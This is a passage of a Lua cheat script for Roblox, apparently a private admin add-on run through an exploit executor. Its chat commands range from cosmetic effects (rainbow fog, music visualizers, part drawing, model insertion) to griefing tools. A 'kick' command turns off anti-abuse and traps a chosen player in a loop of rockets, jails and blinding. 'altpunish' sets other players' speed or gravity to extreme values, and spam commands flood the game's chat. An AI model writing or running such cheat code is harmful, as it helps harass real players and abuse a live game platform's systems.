                            if MouseTarget:FindFirstChild("Humanoid") and not string.find(MouseTarget.Name," ") then
                                message = message.." "..MouseTarget.Name
                            else
                                message = message.." ".."COULDNOTFINDPLAYER"
                            end
                        else
                        message = message.." "..args[i]
                        end
                end
                    for i,v in pairs(message:split("|")) do
                        game.Players:Chat(v)
                    end
                end
end)
end)

addCommand("unbind",{},function()
    for i,v in pairs(Connections) do if i:sub(1,8) == "_Binding" then v:Disconnect() end end
end)

addCommand("mouse",{},function()
    chr.HumanoidRootPart.CFrame = plr:GetMouse().Hit
end)

game.Players.LocalPlayer.Chatted:Connect(function(house)
if string.sub(house, 0, 7) == ".house " then
local player = string.sub(house, 8)
game.Players:Chat("invis/me")
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-28.6829948, 8.2299995, 66.4913253))
wait(.35)
game.Players:Chat("tp/"..player.."/me")
game.Players:Chat("vis/me")
end
end)

addCommand("house",{},function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-28.3467445, 8.22999954, 73.5216293)
end)

addCommand("toregen",{},function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Terrain["_Game"].Admin.Regen.CFrame * CFrame.new(0,2.5,0)
end)

addCommand("getusername",{"player (optional silentmode)"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
        setclipboard(v.Name)
        if not args[2] then
            GUI:SendMessage(ScriptName, "The selected player's username has been copied to the clipboard.")
        end
    end
end)

addCommand("getdisplayname",{"player (optional silentmode)"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
        setclipboard(v.DisplayName)
        if not args[2] then
            GUI:SendMessage(ScriptName, "The selected player's display name has been copied to the clipboard.")
        end
    end
end)

addCommand("spamcommand",{"delay","command"},function(args)
    runCommand(prefix.."spamcommands",args)
end)

addCommand("unspamcommands",{},function()
    Loops.spamcommand = false
end)

addCommand("spamcmd",{"delay","command"},function(args)
    runCommand(prefix.."spamcommands",args)
end)

addCommand("unspam",{},function()
    Loops.spamcommand = false
end)

addCommand("unspam",{},function()
    runCommand(prefix.."unspamcommands",{})
end)

addCommand("rainbowfog",{"range"},function(args)
    local Range = tonumber(args[1])
    local RainbowValue = 0
    
    Loops.rainbowfog=true
    repeat wait(0.05)
        RainbowValue = RainbowValue + 1/250
    if RainbowValue >= 1 then
        RainbowValue = 0
    end
        if game.Lighting.FogEnd ~= Range then
            game.Players:Chat("fogend "..tostring(Range))
        end
        game.Players:Chat("fogcolor "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).R*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).G*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).B*255)))
    until not Loops.rainbowfog
end)

addCommand("kick",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
    game.Players:Chat(".unantiabuse")
	game.Players:Chat("respawn "..v.Name)
        wait(.25)
        game.Players:Chat("rocket/"..v.Name)
        wait(.39)
        game.Players:Chat("jail/"..v.Name)
        game.Players:Chat("blind "..v.Name)
        game.Players:Chat("ff "..v.Name)
		task.wait(.23)
Loops.rk = true
repeat wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame *CFrame.new(0,0,2) * CFrame.Angles(0,math.rad(180),0)
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name)  
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name)  
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name) 
game.Players:Chat("rocket/me/"..v.Name.."/me/"..v.Name.."/me/"..v.Name)
until not Loops.rk
	end
end)

addCommand("skick",{},function()
Loops.rk = false
game.Players:Chat("unrocket/all/all/all")
game.Players:Chat("unrocket/all/all/all")
game.Players:Chat("unrocket/all/all/all")
game.Players:Chat("unrocket/all/all/all")
game.Players:Chat("unrocket/all/all/all")
game.Players:Chat(".antiabuse")
end)

addCommand("rainbowbaseplate",{},function()
    local RainbowValue = 0
    
    local Paint = GetPaint()
    Loops.rainbowbaseplate=true
    repeat wait()
        local s,f=pcall(function()
        RainbowValue = RainbowValue + 1/50
    if RainbowValue >= 1 then
        RainbowValue = 0
    end
        if not chr:FindFirstChild("PaintBucket") then Paint = GetPaint() end
        Paint:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{
                            ["Part"] = game:GetService("Workspace").Terrain["_Game"].Workspace.Baseplate,
                            ["Color"] = Color3.fromHSV(RainbowValue,1,1)
                        })
                    end)until not Loops.rainbowbaseplate
end)

addCommand("unrainbowbaseplate",{},function()
    Loops.rainbowbaseplate = false
end)

addCommand("visualizer",{"r","g","b","customcolor","size","power","fadeamount (optional musicid)"},function(args)
    Loops.visualizer=true
    local RainbowIsOn = false
    local RainbowValue = 0
    if args[4] == "rainbow" then
        RainbowIsOn = true
    end
    local colorthingy = 0
    repeat wait(0.05)
        RainbowValue = RainbowValue + 1/250
        if RainbowValue >= 1 then
            RainbowValue = 0
        end
        if game.Lighting.FogStart ~= (800-tonumber(args[7])) then
            game.Players:Chat("fogstart "..(tostring(800-tonumber(args[7]))))
        end
        if RainbowIsOn then
            colorthingy = colorthingy + 1
            if colorthingy == 3 then
                colorthingy = 0
            game.Players:Chat("fogcolor "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).R*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).G*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).B*255)))
        end
        elseif args[4] == "random" then
            colorthingy = colorthingy + 1
            if colorthingy == 3 then
                colorthingy = 0
            game.Players:Chat("fogcolor "..tostring(math.random(0,255)).." "..tostring(math.random(0,255)).." "..tostring(math.random(0,255)))
            end
        else
            if args[1] ~= "nil" and args[2] ~= "nil" and args[3] ~= "nil" then
                if game.Lighting.FogColor ~= Color3.fromRGB(tonumber(args[1]),tonumber(args[2]),tonumber(args[3])) then
                    game.Players:Chat("fogcolor "..tostring(args[1]).." "..tostring(args[2]).." "..tostring(args[3]))
                end
            end
        end
	if args[8] then runCommand(prefix.."musiclock",{args[8]})
        end
        if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
            game.Players:Chat("fogend "..tostring((game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness/tonumber(args[6])) + tonumber(args[5])))
        else
            game.Players:Chat("fogend "..200)
        end
    until not Loops.visualizer
end)

addCommand("unrainbowfog",{},function()
    Loops.rainbowfog=false
end)

addCommand("unvisualizer",{},function()
    Loops.visualizer=false
end)

addCommand("partvisualizer",{"amount","circlesize","power","w","h","t","angleamount","colordistort","colorupdatetime","turnspeed","custommode"},function(args)
if PersonsAdmin then
for i,v in pairs(args) do args[i] = tonumber(v) end
local Amnt = args[1]
local Size = args[2]
local Power = 50-args[3]
local TurnAmount = args[7]
local ColorDistortion = args[8]
local UpdTime = args[9]
local TurnSpeed = args[10]
local CustomMode = args[11]

local PartSize = Vector3.new(args[4],args[5],args[6])
local Parts = {}

local isLoadingParts = false
local function LoadParts()
	if not isLoadingParts then
		isLoadingParts = true
		Size = 0
		spawn(function()
			wait(1)
			isLoadingParts = false
			Size = args[2]
		end)
		for i=1,Amnt-#Parts do
			game.Players:Chat("part/"..tostring(PartSize.X).."/"..tostring(PartSize.Y).."/"..tostring(PartSize.Z))
		end
	end
end
local function NormalizedColor(R,G,B)
	if R>255 then R=255 end
	if R<0 then R=0 end
	if G>255 then G=255 end
	if G<0 then G=0 end
	if B>255 then B=255 end
	if B<0 then B=0 end
	return Color3.new(R/255,G/255,B/255)
end

local function GetVolume()
	if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound") then
		if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").IsPlaying then
			return workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").PlaybackLoudness/Power
		else
			return 0
		end
	else
		return 0
	end
end

local function GetRawVolume()
	local Vol = 0
	
	if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound") then
		if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").IsPlaying then
			Vol = workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").PlaybackLoudness/ColorDistortion
		else
			Vol = 0
		end
	else
		Vol = 0
	end
	if Vol>255 then Vol=255 end
	return Vol
end

Connections.partvisualizera = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
	if not (#Parts > Amnt or #Parts == Amnt) then
		if v.Size == PartSize then
			table.insert(Parts,v)
		end
	end
end)

local Offset = 0
Connections.partvisualizerb = game:GetService("RunService").RenderStepped:Connect(function()
	local Volume = GetVolume()*1
	
	if #Parts == 0 then
		LoadParts()
	end

	for i,v in pairs(Parts) do
		if v.Parent ~= nil then
			local For = math.rad(i*(360/#Parts))+Offset
	    	v.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0,For,0) * CFrame.new(0,0,Size+Volume) * CFrame.Angles(math.rad(Volume*TurnAmount),0,0)
			v.Velocity = Vector3.new(-30,0.5,0.5)
			v.CanCollide = false
		else
			table.remove(Parts,i)
			spawn(function()
			wait(0.1)
			LoadParts()
			end)
		end
	end
	Offset = Offset + TurnSpeed
	
	if #Parts < Amnt then
		LoadParts()
	end
end)

local RainbowValue = 0
Loops.partvisualizer = true
repeat
pcall(function()
local Paint
pcall(function()
Paint = GetPaint()
end)
Paint.LocalScript.Disabled = true
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("PaletteGui") then
game.Players.LocalPlayer.PlayerGui.PaletteGui:Destroy()
end
local ColorXD
RainbowValue = RainbowValue + 0.05
if RainbowValue >= 1 then
	RainbowValue = 0
end
if CustomMode==2 then
ColorXD = NormalizedColor(Color3.fromHSV(RainbowValue,1,1).R*255 + GetRawVolume(),Color3.fromHSV(RainbowValue,1,1).G*255 + GetRawVolume(),Color3.fromHSV(RainbowValue,1,1).B*255 + GetRawVolume())
elseif CustomMode==3 then
local numbert = math.ceil((os.clock()*4)%4)
local dacolorineed
if numbert == 0 or numbert == 1 then
dacolorineed = Color3.new(1,0,0)
end
if numbert == 2 then
dacolorineed = Color3.new(1,1,0)
end
if numbert == 3 then
dacolorineed = Color3.new(0,1,0)
end
if numbert == 4 then
dacolorineed = Color3.new(0,0,1)
end
ColorXD = NormalizedColor(dacolorineed.R*255 + GetRawVolume(),dacolorineed.G*255 + GetRawVolume(),dacolorineed.B*255 + GetRawVolume())
elseif CustomMode==4 then
ColorXD = NormalizedColor(args[12] + GetRawVolume(),args[13] + GetRawVolume(),args[14] + GetRawVolume())
else
if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Torso") and CustomColor then
ColorXD = NormalizedColor(game.Players.LocalPlayer.Character.Torso.Color.R*255 + GetRawVolume(),game.Players.LocalPlayer.Character.Torso.Color.G*255 + GetRawVolume(),game.Players.LocalPlayer.Character.Torso.Color.B*255 + GetRawVolume())
else
ColorXD = NormalizedColor(CustomColor.R*255 + GetRawVolume(),CustomColor.G*255 + GetRawVolume(),CustomColor.B*255 + GetRawVolume())
end
end

for i,v in pairs(Parts) do
	if v and v.Parent ~= nil then
		spawn(function()
			if CustomMode==1 then
			Paint:WaitForChild("Remotes",1).ServerControls:InvokeServer("PaintPart",{["Part"]=v,["Color"]=NormalizedColor(math.random(0,255),math.random(0,255),math.random(0,255))})
			else
			Paint:WaitForChild("Remotes",1).ServerControls:InvokeServer("PaintPart",{["Part"]=v,["Color"]=ColorXD})
			end
		end)
	end
end
end) wait(UpdTime) until not Loops.partvisualizer

LoadParts()
else GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.") end
end)

addCommand("partvisualizerwebsocket",{"amount","circlesize","power","w","h","t","angleamount","colordistort","colorupdatetime","turnspeed","updatetime","custommode"},function(args)
if PersonsAdmin then
local s,f=pcall(function()
for i,v in pairs(args) do args[i] = tonumber(v) end
local Amnt = args[1]
local Size = args[2]
local Power = 10-args[3]
local TurnAmount = args[7]
local ColorDistortion = args[8]
local UpdTime = args[9]
local TurnSpeed = args[10]
local CustomMode = args[12]

local PartSize = Vector3.new(args[4],args[5],args[6])
local Parts = {}

local isLoadingParts = false
local function LoadParts()
	if not isLoadingParts then
		isLoadingParts = true
		Size = 0
		spawn(function()
			wait(1)
			isLoadingParts = false
			Size = args[2]
		end)
		for i=1,Amnt-#Parts do
			game.Players:Chat("part/"..tostring(PartSize.X).."/"..tostring(PartSize.Y).."/"..tostring(PartSize.Z))
		end
	end
end
local function NormalizedColor(R,G,B)
	if R>255 then R=255 end
	if R<0 then R=0 end
	if G>255 then G=255 end
	if G<0 then G=0 end
	if B>255 then B=255 end
	if B<0 then B=0 end
	return Color3.new(R/255,G/255,B/255)
end

local lolVolume = 0
Connections.partvisualizerc = CurrentWebsocket.OnMessage:Connect(function(msg)
   lolVolume = tonumber(msg)
end)

Loops.partvisualizerb = true
if args[11] == -1 then
spawn(function()
repeat game:GetService("RunService").RenderStepped:Wait()
   CurrentWebsocket:Send("v")
until not Loops.partvisualizerb
end)
else
spawn(function()
repeat wait(args[11])
   CurrentWebsocket:Send("v")
until not Loops.partvisualizerb
end)
end

local function GetVolume()
	return lolVolume/Power
end

local function GetRawVolume()
	local Vol = lolVolume*ColorDistortion
	if Vol>255 then Vol=255 end
	print(Vol)
	return Vol
end

Connections.partvisualizera = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
	if not (#Parts > Amnt or #Parts == Amnt) then
		if v.Size == PartSize then
			table.insert(Parts,v)
		end
	end
end)

local Offset = 0
Connections.partvisualizerb = game:GetService("RunService").RenderStepped:Connect(function()
	local Volume = GetVolume()*1
	
	if #Parts == 0 then
		LoadParts()
	end

	for i,v in pairs(Parts) do
		if v.Parent ~= nil then
			local For = math.rad(i*(360/#Parts))+Offset
	    	v.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0,For,0) * CFrame.new(0,0,Size+Volume) * CFrame.Angles(math.rad(Volume*TurnAmount),0,0)
			v.Velocity = Vector3.new(-30,0.5,0.5)
			v.CanCollide = false
		else
			table.remove(Parts,i)
			spawn(function()
			wait(0.1)
			LoadParts()
			end)
		end
	end
	Offset = Offset + TurnSpeed
	
	if #Parts < Amnt then
		LoadParts()
	end
end)

local RainbowValue = 0
Loops.partvisualizera = true
repeat
pcall(function()
local Paint
pcall(function()
Paint = GetPaint()
end)
Paint.LocalScript.Disabled = true
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("PaletteGui") then
game.Players.LocalPlayer.PlayerGui.PaletteGui:Destroy()
end

local ColorXD
RainbowValue = RainbowValue + 0.05
if RainbowValue >= 1 then
	RainbowValue = 0
end
if CustomMode==2 then
ColorXD = NormalizedColor(Color3.fromHSV(RainbowValue,1,1).R*255 + GetRawVolume(),Color3.fromHSV(RainbowValue,1,1).G*255 + GetRawVolume(),Color3.fromHSV(RainbowValue,1,1).B*255 + GetRawVolume())
elseif CustomMode==3 then
local numbert = math.ceil((os.clock()*4)%4)
local dacolorineed
if numbert == 0 or numbert == 1 then
dacolorineed = Color3.new(1,0,0)
end
if numbert == 2 then
dacolorineed = Color3.new(1,1,0)
end
if numbert == 3 then
dacolorineed = Color3.new(0,1,0)
end
if numbert == 4 then
dacolorineed = Color3.new(0,0,1)
end
ColorXD = NormalizedColor(dacolorineed.R*255 + GetRawVolume(),dacolorineed.G*255 + GetRawVolume(),dacolorineed.B*255 + GetRawVolume())
elseif CustomMode==4 then
ColorXD = NormalizedColor(args[12] + GetRawVolume(),args[13] + GetRawVolume(),args[14] + GetRawVolume())
else
if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Torso") and CustomColor then
ColorXD = NormalizedColor(game.Players.LocalPlayer.Character.Torso.Color.R*255 + GetRawVolume(),game.Players.LocalPlayer.Character.Torso.Color.G*255 + GetRawVolume(),game.Players.LocalPlayer.Character.Torso.Color.B*255 + GetRawVolume())
else
ColorXD = NormalizedColor(CustomColor.R*255 + GetRawVolume(),CustomColor.G*255 + GetRawVolume(),CustomColor.B*255 + GetRawVolume())
end
end

for i,v in pairs(Parts) do
	if v and v.Parent ~= nil then
		spawn(function()
			if CustomMode==1 then
			Paint:WaitForChild("Remotes",1).ServerControls:InvokeServer("PaintPart",{["Part"]=v,["Color"]=NormalizedColor(math.random(0,255),math.random(0,255),math.random(0,255))})
			else
			Paint:WaitForChild("Remotes",1).ServerControls:InvokeServer("PaintPart",{["Part"]=v,["Color"]=ColorXD})
			end
		end)
	end
end
end) wait(UpdTime) until not Loops.partvisualizera

LoadParts()
end)if not s then print(f)end
else GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.") end
end)

addCommand("reanimate",{},function()
	if PersonsAdmin then
		local char = game.Players.LocalPlayer.Character
		char.Archivable = true
		
		local fakechar = char:Clone()
		fakechar.Name = "_charPRAdmin"
		fakechar.Parent = workspace
		
		game.Players.LocalPlayer.Character = fakechar
		
		fakechar.Animate.Disabled = true
		fakechar.Animate.Disabled = false
		
		Loops.reanimate = true
		
		local Limbs = {}
		Limbs.LA = Instance.new("Part")
		Limbs.RA = Instance.new("Part")
		Limbs.LL = Instance.new("Part")
		Limbs.RL = Instance.new("Part")
		
		for i,v in pairs(Limbs) do
			v.Name = "Temporary"
		end
		
		local LimbNames = {
			["LA"] = "Left Arm",
			["RA"] = "Right Arm",
			["LL"] = "Left Leg",
			["RL"] = "Right Leg"
		}
		
		Connections.reanimate = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
			if v.Name ~= "Part" then return end
			if not v:IsA("BasePart") then return end
			if v.Size ~= Vector3.new(1,2,1) then return end
			
			for i,v2 in pairs(Limbs) do
				if v2.Parent == nil then
					Limbs[i] = v
					break
				end
			end
		end)
		
		local fixLimbsDebounce = false
		local function fixLimbs()
			if fixLimbsDebounce then return end
			print("Limbfix requested")
			
			fixLimbsDebounce = true
			spawn(function()
				wait(1)
				fixLimbsDebounce = false
			end)
			
			for i,v in pairs(Limbs) do
				if v.Parent == nil then
					game.Players:Chat("part/1/2/1")
				end
			end
		end
		
		fixLimbs()
		
		spawn(function()
			while Loops.reanimate do game:GetService("RunService").RenderStepped:Wait()
				char = workspace[game.Players.LocalPlayer.Name]
				for i,v in pairs(char:GetDescendants()) do
					if v:IsA("BasePart") and v.CanCollide then
						v.CanCollide = false
					end
					if v:IsA("BasePart") then
						v.Transparency = 1
						v.Velocity = Vector3.new()
						v.RotVelocity = Vector3.new()
					end
				end
				
				if char:FindFirstChild("Left Arm") then
					game.Players:Chat("removelimbs me")
					char:FindFirstChild("Left Arm"):Destroy()
				end
				
				char.HumanoidRootPart.CFrame = fakechar.Torso.CFrame
				if game.Players.LocalPlayer.Character ~= fakechar then
					game.Players.LocalPlayer.Character = fakechar
				end
				
				for i,v in pairs(Limbs) do
					if v.Parent ~= nil then
						v.CFrame = fakechar[LimbNames[i]].CFrame
						v.CanCollide = false
						v.Velocity = Vector3.new()
						v.RotVelocity = Vector3.new()
					else
						fixLimbs()
					end
				end
			end
		end)
	else
		GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.")
	end
end)

addCommand("unreanimate",{},function()
	Loops.reanimate = false
	Connections.reanimate:Disconnect()
	workspace["_charPRAdmin"]:Destroy()
	game.Players:Chat("reset me")
end)

addCommand("fixreanimate",{},function()
	runCommand(prefix.."unreanimate",{})
	local chr = game.Players.LocalPlayer.Character
	repeat wait() until not chr or chr.Parent == nil
	runCommand(prefix.."reanimate",{})
end)

addCommand("unpartvisualizer",{},function()
Connections.partvisualizera:Disconnect()
Connections.partvisualizerb:Disconnect()
Loops.partvisualizer = false
end)

addCommand("unpartvisualizerwebsocket",{},function()
Connections.partvisualizera:Disconnect()
Connections.partvisualizerb:Disconnect()
Connections.partvisualizerc:Disconnect()
Loops.partvisualizera = false
Loops.partvisualizerb = false
end)

addCommand("fixnet",{},function()
	fixNet()
end)

addCommand("nethelper",{},function()
	Connections.nethelper = game:GetService("RunService").Heartbeat:Connect(function()
		fixNet()
	end)
end)

addCommand("unnethelper",{},function()
	Connections.nethelper:Disconnect()
end)

addCommand("unloadparts",{},function()
	for i,v in pairs(workspace.Terrain["_Game"].Folder:GetChildren()) do
		if v:IsA("Part") and v.Name == "Part" then
			v:Destroy()
		end
	end
end)

addCommand("insert",{"modelid (optional transparency-threshhold)"},function(args)
if PersonsAdmin then
if not args[2] then args[2]="0.75" end
function Netify(Part,Pos)
	fixNet()
	spawn(function()
	wait(.5)
	Part.Anchored = true
	wait(.5)
	Part.CanCollide = false
	local FakeCollide = Instance.new("Part",Part)
	FakeCollide.Transparency = 1
	FakeCollide.Anchored = true
	FakeCollide.CFrame = Part.CFrame
	FakeCollide.Size = Part.Size
	end)
	spawn(function()
		repeat game:GetService("RunService").Heartbeat:Wait()
			Part.CFrame = Pos
			Part.Velocity = Vector3.new(34,54,0)
		until not Part
	end)
end

local CurChar = game.Players.LocalPlayer.Character
local Model = Instance.new("Model",workspace)
Model.Name = "WITH LOVE FROM PR <3"
local Primarypart = Instance.new("Part",Model)
Primarypart.CFrame = CFrame.new(0,0,0)
Primarypart.Size = Vector3.new(0.05,0.05,0.05)
Primarypart.CanCollide = false
Primarypart.Anchored = true
Primarypart.Transparency = 1
Model.PrimaryPart = Primarypart

for i,v in pairs(game:GetObjects("rbxassetid://"..args[1])) do
v.Parent = Model
if v:IsA("Model") then
v:MoveTo(Vector3.new(0,0,0))
else
pcall(function()
v.CFrame = CFrame.new(0,0,0)
end)
pcall(function()
v.Position = Vector3.new()
end)
end
pcall(function()
for i,newv in pairs(v:GetDescendants()) do
pcall(function()
newv.Anchored = true
end)
end
end)
end
Model:MoveTo(game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,10,0))

for i,v in pairs(Model:GetDescendants()) do
pcall(function()
v.Anchored = true
end)
end

local MoveTool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
MoveTool.Name = "Move Model"
MoveTool.RequiresHandle = false
MoveTool.Activated:Connect(function()
	Model:MoveTo(game.Players.LocalPlayer:GetMouse().Hit.Position)
end)

local Confirm = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
Confirm.Name = "Confirm"
Confirm.RequiresHandle = false
Confirm.Activated:Connect(function()
	Confirm:Destroy()
end)

local Cancel = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
Cancel.Name = "Cancel"
Cancel.RequiresHandle = false
Cancel.Activated:Connect(function()
	Cancel:Destroy()
end)

repeat wait() until not Confirm or (Confirm.Parent ~= game.Players.LocalPlayer.Backpack and Confirm.Parent ~= CurChar) or not Cancel or (Cancel.Parent ~= game.Players.LocalPlayer.Backpack and Cancel.Parent ~= CurChar)
if CurChar.Parent ~= nil and Cancel.Parent ~= nil then
	MoveTool:Destroy()
	Cancel:Destroy()
	print("Building model")
	
	print("Repairing model")
	for i,v in pairs(Model:GetDescendants()) do
		if v:IsA("BasePart") then
			if v.Size.X>10 or v.Size.Y>10 or v.Size.Z>10 then
				local vParent = v.Parent
				
				for i,v in pairs(splitPart(v)) do
					v.Parent = Model
				end
			end
		else
			if not (v:IsA("Model") or v:IsA("Folder") or v:IsA("Configuration")) then
				print(v:GetFullName().." is not a Part ("..v.ClassName..") and has been deleted")
				v:Destroy()
			end
		end
	end

	for i,v in pairs(Model:GetDescendants()) do
	pcall(function()
		if v and v.Transparency and v.Transparency>tonumber(args[2]) then
			print("Part "..v:GetFullName().." is over "..args[2].." transparency and has been deleted")
			v:Destroy()
		end
	end)
	end
	
	for i,v in pairs(Model:GetDescendants()) do
		if v:IsA("BasePart") or v:IsA("Seat") then
			local Replacement = Instance.new("Part",Model)
			Replacement.Anchored = true
			Replacement.CFrame = v.CFrame
			Replacement.Size = v.Size
			Replacement.Color = v.Color
			v:Destroy()
		else
			v:Destroy()
		end
	end
	
	print("Formatting parts to table")
	local Parts = {}
	for i,v in pairs(Model:GetDescendants()) do
		if not (v:IsA("Model") or v:IsA("Folder") or v:IsA("Configuration")) then
			table.insert(Parts,{v.CFrame,v.Size,v.Color})
			v:Destroy()
		end
	end
	
	print("Cleaning")
	Model:Destroy()
	
	GetPaint()
	
	print("Building model from table")
	local Part = nil
	local FirstPart = nil
	local LookingFor = nil
	local ChildAdded = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
		pcall(function()
			if v and v.Size and LookingFor and v.Size == LookingFor[2] then
				Part = v
			end
		end)
	end)
	for i,v in pairs(Parts) do
		local Pos = v[1]
		local Size = v[2]
		local Color = v[3]
		LookingFor = v
		Part = nil
		game.Players:Chat("part/"..tostring(Size.X).."/"..tostring(Size.Y).."/"..tostring(Size.Z))
		if i~=1 then
			if FirstPart.Parent==nil then
				print("Parts were destroyed, cancelling")
				break
			end
		end
		repeat wait() until Part
		if i==1 then
			FirstPart = Part
		end
		task.spawn(function()
		GetPaint():WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{["Part"]=Part,["Color"]=Color})
		end)
		Netify(Part,Pos)
	end
else
	Model:Destroy()
	MoveTool:Destroy()
	Confirm:Destroy()
	print("Build cancelled")
end
else GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.") end
end)

addCommand("draw",{"size","waittime","israinbow","r","g","b"},function(args)
if PersonsAdmin then
	local Size = tonumber(args[1])
local WaitTime = tonumber(args[2])
local IsRainbow = stringToBool(args[3])
local Color = Color3.fromRGB(tonumber(args[4]),tonumber(args[5]),tonumber(args[6]))

local IsMouseDown = false
Connections.drawa = game:GetService("UserInputService").InputBegan:Connect(function(thing,gp)
	if not gp and thing.UserInputType == Enum.UserInputType.MouseButton1 then
		IsMouseDown = true
	end
end)
Connections.drawb = game:GetService("UserInputService").InputEnded:Connect(function(thing,gp)
	if not gp and thing.UserInputType == Enum.UserInputType.MouseButton1 then
		IsMouseDown = false
	end
end)

local Positions = {}
local PartsPlaced = 0

Connections.drawc = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(part)
	if part.Size and part.Size == Vector3.new(Size,Size,Size) then
		local Paint
		pcall(function()
			Paint = GetPaint()
		end)
		Paint.LocalScript.Disabled = true
		if game.Players.LocalPlayer.PlayerGui:FindFirstChild("PaletteGui") then
			game.Players.LocalPlayer.PlayerGui.PaletteGui:Destroy()
		end
		if IsRainbow then Color = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)) end
		spawn(function()
			Paint:WaitForChild("Remotes",1).ServerControls:InvokeServer("PaintPart",{["Part"]=part,["Color"]=Color})
		end)
		PartsPlaced = PartsPlaced + 1
		local WhereOne= Positions[PartsPlaced]
		task.spawn(function()
			fixNet()
			pcall(function()
				part.CanCollide = false
			end)
			task.spawn(function()
				wait(.5)
				part.Anchored = true
			end)
			while true do game:GetService("RunService").RenderStepped:Wait()
				part.Velocity = Vector3.new(34,54,0)
				part.CFrame = WhereOne
			end
			Positions = {}
			PartsPlaced = 0
		end)
	end
end)

Loops.draw = true
repeat wait(WaitTime)
	if IsMouseDown then
		spawn(function()
		table.insert(Positions,CFrame.new(game.Players.LocalPlayer:GetMouse().Hit.p))
		local TheOneIAdded = #Positions
		game.Players:Chat("part/"..Size.."/"..Size.."/"..Size)
		end)
	end
until not Loops.draw
else GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.") end
end)

addCommand("stopdraw",{},function()
	Loops.draw = false
	Connections.drawa:Disconnect()
	Connections.drawb:Disconnect()
	Connections.drawc:Disconnect()
end)

addCommand("altpunish",{"player"},function(args)
    local People = GetPlayers(args[1])
    for i,v in pairs(People) do
        game.Players:Chat("speed "..v.Name.." inf")
    end
end)

addCommand("altpunish2",{"player"},function(args)
    local People = GetPlayers(args[1])
    for i,v in pairs(People) do
        game.Players:Chat("setgrav "..v.Name.." -9e9")
    end
end)

addCommand("altdisco",{},function()
    local s,f=pcall(function() --  0.5 "..prefix.."colorallbrickcolor Bright red|"..prefix.."colorallbrickcolor Bright yellow|"..prefix.."colorallbrickcolor Bright green|"..prefix.."colorallbrickcolor Bright blue"
    runCommand(prefix.."spamcommand",{"0.5",prefix.."colorallbrickcolor","Bright red|"..prefix.."colorallbrickcolor","Bright","yellow|"..prefix.."colorallbrickcolor","Bright","green|"..prefix.."colorallbrickcolor","Bright","blue"})
    end)
end)

addCommand("unaltdisco",{},function()
    runCommand(prefix.."unspamcommand",{})
end)

addCommand("scriptinfo",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("pm "..v.Name.." ["..ScriptName.."]\n\n"..ScriptName.." is a PRIVATE SCRIPT!\nOnly a select few people have access to this script, and that\nmost likely does not include you. There are "..tostring(#commandlist).." commands in\nour script, and the commands can be viewed by running "..prefix.."cmds\nor "..prefix.."altcmds in chat.")
    end
end)

addCommand("attachtool",{},function()
    local btool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
  local SelectionBox = Instance.new("SelectionBox",game.Workspace)
  local hammer = Instance.new("Part")
  hammer.Parent = btool
  hammer.Name = ("Handle")
  hammer.CanCollide = false
  hammer.Anchored = false


  SelectionBox.Name = "oof"
